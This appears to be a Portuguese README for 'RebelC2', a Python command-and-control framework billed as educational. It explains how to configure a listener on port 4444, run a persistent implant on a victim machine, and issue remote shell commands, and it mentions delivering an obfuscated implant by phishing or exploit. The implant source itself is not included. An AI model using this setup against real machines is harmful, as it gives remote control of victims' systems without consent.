# RebelC2 - Um Framework de Comando e Controle em Python

RebelC2 é um framework de Command and Control (C2) leve, escrito em Python, projetado para fins educacionais. Ele permite que um operador gerencie remotamente múltiplos sistemas comprometidos (implantes) através de uma interface de linha de comando simples.

## Funcionalidades

-   **Servidor C2 Multithread:** Capaz de gerenciar múltiplas conexões de implantes simultaneamente.
-   **Console Interativo:** Interface de linha de comando para listar sessões e interagir com elas.
-   **Implante Persistente:** O implante tenta se reconectar ao servidor C2 se a conexão for perdida.
-   **Execução Remota de Comandos:** Envia comandos do shell para o sistema comprometido e recebe a saída.
-   **Código Simples:** Fácil de entender, modificar e expandir.

## Estrutura

-   `server.py`: O script do servidor que o operador executa para escutar por conexões.
-   `implant.py`: O script do cliente (implante) que é executado na máquina da vítima.

## Configuração

### 1. Servidor C2

O servidor foi projetado para ser executado em qualquer máquina Linux ou Windows com Python 3.

-   **IP e Porta:** Por padrão, o servidor (`server.py`) escuta em `0.0.0.0` na porta `4444`. Isso significa que ele aceitará conexões de qualquer interface de rede. Você pode alterar essas configurações no final do arquivo:
    ```python
    if __name__ == "__main__":
        HOST = '0.0.0.0'  # Mantenha 0.0.0.0 para escutar em todas as interfaces
        PORT = 4444       # Altere a porta se necessário
        server = C2Server(HOST, PORT)
        server.start()
    ```

### 2. Implante

O implante precisa saber o endereço IP e a porta do servidor C2 para se conectar.

-   **IP e Porta:** Abra o arquivo `implant.py` e altere as variáveis `C2_HOST` e `C2_PORT` para corresponderem ao endereço IP **público ou da rede local** do seu servidor C2.
    ```python
    if __name__ == "__main__":
        C2_HOST = 'SEU_IP_AQUI'  # IMPORTANTE: Altere para o IP do seu servidor C2
        C2_PORT = 4444
        implant = Implant(C2_HOST, C2_PORT)
        implant.run()
    ```
    -   **Para testes locais:** Use `127.0.0.1`.
    -   **Para testes em rede local:** Use o IP privado do servidor (ex: `192.168.1.10`).
    -   **Para acesso externo:** Use o IP público do servidor e configure o redirecionamento de portas (port forwarding) em seu roteador.

## Como Usar

1.  **Inicie o Servidor C2:**
    Execute o script do servidor em sua máquina. Ele começará a escutar por conexões.
    ```bash
    python3 server.py
    ```

2.  **Execute o Implante na Vítima:**
    Transfira e execute o script `implant.py` na máquina alvo.
    ```bash
    python3 implant.py
    ```
    *Nota: Em um cenário real, este implante seria ofuscado e entregue através de um vetor de ataque (ex: phishing, exploit).*

3.  **Gerencie as Sessões:**
    Quando um implante se conectar, você verá uma notificação no console do C2.

    -   **Listar sessões ativas:**
        Digite `list` para ver todos os implantes conectados.
        ```
        C2> list

        --- Sessões Ativas ---
          ID: 0 | Endereço: 127.0.0.1:54321
        ---------------------
        ```

    -   **Selecionar uma sessão para interagir:**
        Use o comando `select` seguido do ID da sessão.
        ```
        C2> select 0
        ```

    -   **Enviar Comandos:**
        Uma vez dentro de uma sessão, você pode executar qualquer comando do shell do sistema operacional alvo (`ls`, `dir`, `whoami`, `ipconfig`, etc.).
        ```
        [+] Interagindo com a sessão 0 (127.0.0.1)
        Digite 'quit' ou 'exit' para retornar ao menu principal.

        shell@127.0.0.1> whoami
        desktop-user\john
        
        shell@127.0.0.1> ls
        documento.txt
        fotos
        videos
        ```

    -   **Sair da Sessão:**
        Digite `quit` ou `exit` para retornar ao console principal do C2.

    -   **Encerrar o Servidor:**
        No console principal, digite `exit` para fechar o servidor C2 de forma limpa.

## Aviso Legal

Este projeto foi criado estritamente para fins educacionais e de pesquisa em segurança da informação. O uso indevido deste software para atacar alvos sem consentimento prévio e mútuo é ilegal. O autor não se responsabiliza por qualquer dano ou uso indevido deste material.
